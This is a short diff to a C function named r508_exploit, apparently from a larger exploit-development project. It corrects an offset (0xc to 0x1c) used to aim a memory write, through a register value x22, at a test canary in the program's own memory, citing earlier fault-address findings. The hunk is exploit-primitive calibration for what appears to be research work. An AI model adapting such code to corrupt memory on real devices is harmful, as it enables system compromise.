@@ -31438,11 +31438,12 @@ static void r508_exploit(void) {
         sigaction(SIGBUS, &sa_old_bus, NULL);
     }
 
-    /* Test B: Write to our OWN writable memory */
-    rlog("\n  Test B: Targeting canary in own process memory...\n");
+    /* Test B: Write to our OWN writable memory.
+       Phase 7A showed offset is 0x1c (FAR = x22 + 0x1c), not 0xc. */
+    rlog("\n  Test B: Targeting canary (offset 0x1c confirmed from Test A)...\n");
     static volatile uint32_t r508_canary = 0xCAFEBABE;
     uint64_t canary_addr = (uint64_t)(uintptr_t)&r508_canary;
-    uint64_t x22_val = canary_addr - 0xc;
+    uint64_t x22_val = canary_addr - 0x1c;
     rlog("  canary at %p = 0x%08x, x22 target = 0x%llx\n",
         (void *)&r508_canary, r508_canary, (unsigned long long)x22_val);
 
